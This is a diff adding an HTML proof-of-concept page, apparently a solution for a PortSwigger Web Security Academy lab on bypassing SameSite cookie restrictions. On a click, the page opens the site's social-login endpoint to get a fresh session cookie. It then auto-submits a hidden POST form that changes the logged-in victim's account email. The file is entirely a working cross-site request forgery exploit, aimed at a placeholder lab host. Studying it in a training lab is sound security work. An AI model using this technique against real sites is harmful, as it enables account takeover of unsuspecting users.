@@ -1,0 +1,17 @@
+<!--https://portswigger.net/web-security/learning-paths/csrf/
+csrf-bypassing-samesite-lax-restrictions-with-newly-issued-cookies/csrf/
+bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh-->
+<!DOCTYPE html>
+<html>
+<body>
+<form method="POST" action="https://[LAB-ID].web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="foo@bar.net">
+</form>
+</body>
+<script>
+window.onclick = () => {
+    window.open('https://[LAB-ID].web-security-academy.net/social-login');
+    document.forms[0].submit();
+}
+</script>
+</html>
